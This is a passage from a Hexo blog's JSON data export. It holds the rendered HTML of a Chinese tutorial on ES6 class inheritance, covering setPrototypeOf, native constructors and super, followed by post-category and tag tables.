class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"comment\">// B 的实例继承 A 的实例</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(B.prototype, A.prototype);</span><br><span class=\"line\"><span class=\"comment\">// B 继承 A 的静态属性</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(B, A);</span><br><span class=\"line\"><span class=\"keyword\">const</span> b = <span class=\"keyword\">new</span> B();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//setPrototypeOf的内部实现</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">obj, proto</span>) </span>&#123;</span><br><span class=\"line\">  obj.__proto__ = proto;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//但是setPrototypeOf会有性能问题，通常推荐使用Object.create</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ES6可以继承原生构造函数，而ES5不能</strong></p>\n<ol>\n<li>原生构造函数有：Boolean()、Number()、String()、Array()、Date()、Function()、RegExp()、Error()、Object()</li>\n<li><p>原因：</p>\n<ul>\n<li><p>ES5 是先新建子类的实例对象<code>this</code>，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。</p>\n</li>\n<li><p>ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象<code>this</code>，然后再用子类的构造函数修饰<code>this</code>，使得父类的所有行为都可以继承。</p>\n</li>\n</ul>\n</li>\n<li><p>继承<code>Object</code>的子类，有一个<a href=\"http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object\" target=\"_blank\" rel=\"noopener\">行为差异</a>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NewObj</span> <span class=\"keyword\">extends</span> <span class=\"title\">Object</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\"> <span class=\"keyword\">super</span>(...arguments);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o = <span class=\"keyword\">new</span> NewObj(&#123;<span class=\"attr\">attr</span>: <span class=\"literal\">true</span>&#125;);</span><br><span class=\"line\">o.attr === <span class=\"literal\">true</span>  <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，<code>NewObj</code>继承了<code>Object</code>，但是无法通过<code>super</code>方法向父类<code>Object</code>传参。这是因为 ES6 改变了<code>Object</code>构造函数的行为，一旦发现<code>Object</code>方法不是通过<code>new Object()</code>这种形式调用，ES6 规定<code>Object</code>构造函数会忽略参数。</p>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"四、ES6的super及其this\"><a href=\"#四、ES6的super及其this\" class=\"headerlink\" title=\"四、ES6的super及其this\"></a>四、ES6的super及其this</h2><ol>\n<li><p><strong>作为函数</strong>：在子类构造函数中调用 <code>super()</code> ，super相当于父类constructor</p>\n</li>\n<li><p><strong>作为对象</strong>：</p>\n<ul>\n<li><p>在子类<strong>构造函数或普通函数</strong>中使用 <code>super.methodA()</code> ，super相当于父类原型</p>\n<p><strong>此时methodA中的this指向子类实例</strong></p>\n</li>\n<li><p>在子类<strong>静态方法</strong>中使用 <code>super.methodB()</code>，super指向父类而非原型，此时的methodB指的是父类的静态方法methodB</p>\n<p><strong>此时methodB中的this指向子类</strong>，所以只能通过this访问到子类的静态方法和属性</p>\n</li>\n</ul>\n</li>\n<li><p>在子类中使用super<strong>给属性赋值</strong>  <code>super.father_prop = 1</code> ，相当于子类的this  <code>this.father_prop=1</code> </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>.x = <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>.x); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x); <span class=\"comment\">// 3</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    change()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.x = <span class=\"number\">4</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>.x); <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);  <span class=\"comment\">// 4</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"keyword\">new</span> B();</span><br><span class=\"line\">b.change()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>super</code>的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>); <span class=\"comment\">// 报错</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"五、ES6-的class的本质\"><a href=\"#五、ES6-的class的本质\" class=\"headerlink\" title=\"五、ES6 的class的本质\"></a>五、ES6 的class的本质</h2><ol>\n<li><p>不存在任何继承时。<code>A</code>作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承<code>Function.prototype</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\">A.__proto__ === <span class=\"built_in\">Function</span>.prototype <span class=\"comment\">// true</span></span><br><span class=\"line\">A.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ol>\n<li><a href=\"http://es6.ruanyifeng.com/#docs/class-extends\" target=\"_blank\" rel=\"noopener\">Class 的继承</a></li>\n</ol>"}],"PostAsset":[],"PostCategory":[{"post_id":"cjgw4444t00088d95cjwutu9g","category_id":"cjgw4444g00048d95hm5i0kxt","_id":"cjgw4445w000e8d95t6ypqsmh"},{"post_id":"cjgw4443o00008d953xli2go9","category_id":"cjgw4444g00048d95hm5i0kxt","_id":"cjgw44461000h8d95pw1wu5en"},{"post_id":"cjgw4444700028d9537emrwiw","category_id":"cjgw4444g00048d95hm5i0kxt","_id":"cjgw44467000i8d95y5gxggok"},{"post_id":"cjgw4444l00068d95q7m89vmd","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw4446f000l8d95pkahqqnm"},{"post_id":"cjgw4445700098d95zaf35stn","category_id":"cjgw44467000j8d95185yew20","_id":"cjgw4446t000p8d95xse12bov"},{"post_id":"cjgw4445k000c8d95z1y5htfg","category_id":"cjgw4446i000m8d95j107fd5q","_id":"cjgw44475000v8d95qhvzsd0k"},{"post_id":"cjgw4445u000d8d95k3dkr8uk","category_id":"cjgw44467000j8d95185yew20","_id":"cjgw4447f000x8d95m7976kli"},{"post_id":"cjgw4449f00248d95brx6wh01","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444a2002a8d95lhcncpwp"},{"post_id":"cjgw4449j00268d95u0l3ci6h","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444a9002d8d95u7chog2u"},{"post_id":"cjgw4449r00278d95qhvpkvdm","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444aj002f8d95uvp57x3p"},{"post_id":"cjgw444a000298d95sar4qowm","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444at002h8d95bs6hpb7p"},{"post_id":"cjgw444a8002c8d95nfkjj4v0","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444b7002j8d954lj5ic6o"},{"post_id":"cjgw444ag002e8d95b11d6g2n","category_id":"cjgw444b6002i8d95zwqqagm9","_id":"cjgw444bi002p8d9588ifp81n"},{"post_id":"cjgw444ex003l8d95knfb0sbb","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjgw444fj003r8d95opyip2b5"},{"post_id":"cjgw444eq003h8d95y14qql6y","category_id":"cjgw444ex003j8d95dz27vce3","_id":"cjgw444fk003v8d95u9wugrvt"},{"post_id":"cjgw444eu003i8d95f3xuhkty","category_id":"cjgw444fh003o8d95bfcnkz47","_id":"cjgw444fl003x8d95p12290t4"},{"post_id":"cjkevabzo0000z1fy49xvvsy4","category_id":"cjgw4444g00048d95hm5i0kxt","_id":"cjkevac0l0002z1fy5hhjjief"},{"post_id":"cjkux5ews0000kq95kzvxn338","category_id":"cjgw4444g00048d95hm5i0kxt","_id":"cjkux5eys0003kq95mzlt8iv2"},{"post_id":"cjkws1pcg0000kzfyt43wk2xv","category_id":"cjgw444fh003o8d95bfcnkz47","_id":"cjkws1pe90002kzfykrbqnh15"},{"post_id":"cjldw2dje00000kfyilb8c5yt","category_id":"cjgw4445w000f8d95xy2fd6os","_id":"cjldw2dmc00020kfymcl0ci7w"}],"PostTag":[{"post_id":"cjgw4443o00008d953xli2go9","tag_id":"cjgw4444k00058d95a4wn0vms","_id":"cjgw4446p000o8d957v4p74yi"},{"post_id":"cjgw4443o00008d953xli2go9","tag_id":"cjgw44459000b8d95dce72mtf","_id":"cjgw4446v000q8d956mrdgvma"},{"post_id":"cjgw4443o00008d953xli2go9","tag_id":"cjgw4445x000g8d959zfxhv4b","_id":"cjgw44471000t8d95707nu61i"},{"post_id":"cjgw4443o00008d953xli2go9","tag_id":"cjgw4446a000k8d95coqdcr3r","_id":"cjgw44475000u8d95l0ge57x6"},{"post_id":"cjgw4444700028d9537emrwiw","tag_id":"cjgw4444k00058d95a4wn0vms","_id":"cjgw4447o00108d959vrw23rl"},{"post_id":"cjgw4444700028d9537emrwiw","tag_id":"cjgw4446w000s8d95jbcy0w2i","_id":"cjgw4447p00118d95tnq7pztl"},{"post_id":"cjgw4444700028d9537emrwiw","tag_id":"cjgw44476000w8d95hvr1662k","_id":"cjgw4447q00138d95x83m4lyh"},{"post_id":"cjgw4444700028d9537emrwiw","tag_id":"cjgw4447f000y8d95ddko5bud","_id":"cjgw4447q00148d95jbw79435"},{"post_id":"cjgw4444l00068d95q7m89vmd","tag_id":"cjgw4447n000z8d95kypiaftt","_id":"cjgw4447v00198d95n1jwkx18"},{"post_id":"cjgw4444l00068d95q7m89vmd","tag_id":"cjgw4447p00128d95flh7qd6v","_id":"cjgw4447v001a8d95xawd8062"},{"post_id":"cjgw4444l00068d95q7m89vmd","tag_id":"cjgw4447r00158d95nzug47bg","_id":"cjgw4447w001c8d95xqm1wgl3"},{"post_id":"cjgw4444l00068d95q7m89vmd","tag_id":"cjgw4447s00168d95jq05hneo","_id":"cjgw4447w001d8d952cfntp69"},{"post_id":"cjgw4444l00068d95q7m89vmd","tag_id":"cjgw4447t00178d95vzeypzhf","_id":"cjgw4447x001f8d95sqk4wpy9"},{"post_id":"cjgw4444t00088d95cjwutu9g","tag_id":"cjgw4447u00188d95uhpbcxs0","_id":"cjgw44482001i8d95vd76vtyh"},{"post_id":"cjgw4444t00088d95cjwutu9g","tag_id":"cjgw4447v001b8d95n47h1owv","_id":"cjgw44483001j8d95misar1gt"},{"post_id":"cjgw4444t00088d95cjwutu9g","tag_id":"cjgw4447x001e8d95y889qjd0","_id":"cjgw44484001l8d95ysbcdyv3"},{"post_id":"cjgw4444t00088d95cjwutu9g","tag_id":"cjgw4447y001g8d95tb6s3u4o","_id":"cjgw44484001m8d950hoy756l"},{"post_id":"cjgw4445700098d95zaf35stn","tag_id":"cjgw4447v001b8d95n47h1owv","_id":"cjgw44486001o8d95r0t1imcy"},{"post_id":"cjgw4445700098d95zaf35stn","tag_id":"cjgw44483001k8d9552qnx0u9","_id":"cjgw44486001p8d95v7c07tsi"},{"post_id":"cjgw4445k000c8d95z1y5htfg","tag_id":"cjgw44485001n8d95tzsjwxs8","_id":"cjgw4448d001u8d95wp1ooe2f"},{"post_id":"cjgw4445k000c8d95z1y5htfg","tag_id":"cjgw44487001q8d95bfhy12fy","_id":"cjgw4448d001v8d957ojqs5na"},{"post_id":"cjgw4445k000c8d95z1y5htfg","tag_id":"cjgw44488001r8d95qqlnfx88","_id":"cjgw4448e001x8d95dxswv8w5"},{"post_id":"cjgw4445k000c8d95z1y5htfg","tag_id":"cjgw44489001s8d95b6enxjf4","_id":"cjgw4448f001y8d95jxwlpba5"},{"post_id":"cjgw4445u000d8d95k3dkr8uk","tag_id":"cjgw4447v001b8d95n47h1owv","_id":"cjgw4448h00208d95fwgps656"},{"post_id":"cjgw4445u000d8d95k3dkr8uk","tag_id":"cjgw4448d001w8d95q58sj2cc","_id":"cjgw4448h00218d95eb87r2tk"},{"post_id":"cjgw4445u000d8d95k3dkr8uk","tag_id":"cjgw4448f001z8d95mknpmgo3","_id":"cjgw4448i00228d959f3b0twk"},{"post_id":"cjgw4449f00248d95brx6wh01","tag_id":"cjgw444bf002k8d957l8pfew0","_id":"cjgw444bk002s8d950spconih"},{"post_id":"cjgw4449f00248d95brx6wh01","tag_id":"cjgw444bh002n8d95r60tqb5u","_id":"cjgw444bl002t8d95pjqu63qc"},{"post_id":"cjgw4449f00248d95brx6wh01","tag_id":"cjgw444ak002g8d95wuywlllb","_id":"cjgw444bn002v8d95gb2gqmou"},{"post_id":"cjgw4449j00268d95u0l3ci6h","tag_id":"cjgw444bj002r8d95rv2lr213","_id":"cjgw444bo002w8d95uwbjmf4t"},{"post_id":"cjgw4449j00268d95u0l3ci6h","tag_id":"cjgw4447p00128d95flh7qd6v","_id":"cjgw444bp002y8d95rdtzi5dn"},{"post_id":"cjgw4449r00278d95qhvpkvdm","tag_id":"cjgw444bj002r8d95rv2lr213","_id":"cjgw444bq002z8d9526uh3b54"},{"post_id":"cjgw4449r00278d95qhvpkvdm","tag_id":"cjgw4447p00128d95flh7qd6v","_id":"cjgw444br00318d95o05s54hb"},{"post_id":"cjgw4449r00278d95qhvpkvdm","tag_id":"cjgw4447s00168d95jq05hneo","_id":"cjgw444br00328d95qvyfvdrk"},{"post_id":"cjgw444a000298d95sar4qowm","tag_id":"cjgw444bj002r8d95rv2lr213","_id":"cjgw444bs00348d95r8gvabu0"},{"post_id":"cjgw444a000298d95sar4qowm","tag_id":"cjgw4447p00128d95flh7qd6v","_id":"cjgw444bt00358d95fhkdn38u"},{"post_id":"cjgw444a000298d95sar4qowm","tag_id":"cjgw4447s00168d95jq05hneo","_id":"cjgw444bt00378d95adee814g"},{"post_id":"cjgw444a8002c8d95nfkjj4v0","tag_id":"cjgw444bj002r8d95rv2lr213","_id":"cjgw444bt00388d95jn0cbpf0"},{"post_id":"cjgw444ag002e8d95b11d6g2n","tag_id":"cjgw444bs00338d95jpck53xc","_id":"cjgw444bx003c8d95jh75zken"},{"post_id":"cjgw444ag002e8d95b11d6g2n","tag_id":"cjgw444bt00368d95emdjrjjl","_id":"cjgw444bx003d8d95u4fftinl"},{"post_id":"cjgw444ag002e8d95b11d6g2n","tag_id":"cjgw444bu00398d95ely1ohk9","_id":"cjgw444bx003e8d951f7p46yy"},{"post_id":"cjgw444ag002e8d95b11d6g2n","tag_id":"cjgw444bu003a8d95kst5wqsy","_id":"cjgw444bx003f8d95jeqqijvh"},{"post_id":"cjgw444ag002e8d95b11d6g2n","tag_id":"cjgw444ak002g8d95wuywlllb","_id":"cjgw444by003g8d95u3kv6ztb"},{"post_id":"cjgw444ex003l8d95knfb0sbb","tag_id":"cjgw444bj002r8d95rv2lr213","_id":"cjgw444fh003n8d95oi29vk6h"},{"post_id":"cjgw444ex003l8d95knfb0sbb","tag_id":"cjgw4447p00128d95flh7qd6v","_id":"cjgw444fj003q8d95l9n8om94"},{"post_id":"cjgw444ex003l8d95knfb0sbb","tag_id":"cjgw4447s00168d95jq05hneo","_id":"cjgw444fj003s8d95d0hm5zv8"},{"post_id":"cjgw444eq003h8d95y14qql6y","tag_id":"cjgw444ex003k8d95x4ulxs7p","_id":"cjgw444fl003z8d95qclxltzg"},{"post_id":"cjgw444eu003i8d95f3xuhkty","tag_id":"cjgw444fi003p8d95cc3152j3","_id":"cjgw444fm00408d95bh8gdhji"},{"post_id":"cjkevabzo0000z1fy49xvvsy4","tag_id":"cjkevac080001z1fy1pu7oxe5","_id":"cjkevac0n0003z1fy0svgda23"},{"post_id":"cjkux5ews0000kq95kzvxn338","tag_id":"cjgw4449i00258d950bwrwdck","_id":"cjkux5eyq0001kq95925lfnop"},{"post_id":"cjkux5ews0000kq95kzvxn338","tag_id":"cjgw444a2002b8d95cmm4xsli","_id":"cjkux5eys0002kq95n9k8f8t3"},{"post_id":"cjkux5ews0000kq95kzvxn338","tag_id":"cjgw444ak002g8d95wuywlllb","_id":"cjkux5eys0004kq953gfyea3o"},{"post_id":"cjkws1pcg0000kzfyt43wk2xv","tag_id":"cjkws1pe50001kzfyrkdjibet","_id":"cjkws1peb0004kzfyin5gmfqk"},{"post_id":"cjkws1pcg0000kzfyt43wk2xv","tag_id":"cjkws1pea0003kzfya22v0bt4","_id":"cjkws1peb0005kzfyajams6vh"},{"post_id":"cjldw2dje00000kfyilb8c5yt","tag_id":"cjldw2dm800010kfyxy8rj59p","_id":"cjldw2dmf00030kfyulz2142z"}],"Tag":[{"name":"ionic","_id":"cjgw4444k00058d95a4wn0vms"},{"name":"angularJS","_id":"cjgw44459000b8d95dce72mtf"},{"name":"scope","_id":"cjgw4445x000g8d959zfxhv4b"},{"name":"ion-radio","_id":"cjgw4446a000k8d95coqdcr3r"},{"name":"angularJS2","_id":"cjgw4446w000s8d95jbcy0w2i"},{"name":"开发环境","_id":"cjgw44476000w8d95hvr1662k"},{"name":"webapp","_id":"cjgw4447f000y8d95ddko5bud"},{"name":"onunload","_id":"cjgw4447n000z8d95kypiaftt"},{"name":"红皮书","_id":"cjgw4447p00128d95flh7qd6v"},{"name":"高程","_id":"cjgw4447r00158d95nzug47bg"},{"name":"读书笔记","_id":"cjgw4447s00168d95jq05hneo"},{"name":"存疑","_id":"cjgw4447t00178d95vzeypzhf"},{"name":"Hexo","_id":"cjgw4447u00188d95uhpbcxs0"},{"name":"踩坑","_id":"cjgw4447v001b8d95n47h1owv"},{"name":"博客","_id":"cjgw4447x001e8d95y889qjd0"},{"name":"七牛云","_id":"cjgw4447y001g8d95tb6s3u4o"},{"name":"mongoDB","_id":"cjgw44483001k8d9552qnx0u9"},{"name":"Node.js","_id":"cjgw44485001n8d95tzsjwxs8"},{"name":"Express","_id":"cjgw44487001q8d95bfhy12fy"},{"name":"web server","_id":"cjgw44488001r8d95qqlnfx88"},{"name":"教程","_id":"cjgw44489001s8d95b6enxjf4"},{"name":"npm","_id":"cjgw4448d001w8d95q58sj2cc"},{"name":"nodeJS","_id":"cjgw4448f001z8d95mknpmgo3"},{"name":"Hybrid APP","_id":"cjgw4449i00258d950bwrwdck"},{"name":"离线应用","_id":"cjgw444a2002b8d95cmm4xsli"},{"name":"总结","_id":"cjgw444ak002g8d95wuywlllb"},{"name":"编码","_id":"cjgw444bf002k8d957l8pfew0"},{"name":"转码","_id":"cjgw444bh002n8d95r60tqb5u"},{"name":"Javascript","_id":"cjgw444bj002r8d95rv2lr213"},{"name":"CSS","_id":"cjgw444bs00338d95jpck53xc"},{"name":"垂直居中","_id":"cjgw444bt00368d95emdjrjjl"},{"name":"水平居中","_id":"cjgw444bu00398d95ely1ohk9"},{"name":"方案总结","_id":"cjgw444bu003a8d95kst5wqsy"},{"name":"http","_id":"cjgw444ex003k8d95x4ulxs7p"},{"name":"HTTP","_id":"cjgw444fi003p8d95cc3152j3"},{"name":"Webpack","_id":"cjkevac080001z1fy1pu7oxe5"},{"name":"HTTP2","_id":"cjkws1pe50001kzfyrkdjibet"},{"name":"HTTPS","_id":"cjkws1pea0003kzfya22v0bt4"},{"name":"ES6","_id":"cjldw2dm800010kfyxy8rj59p"}]}}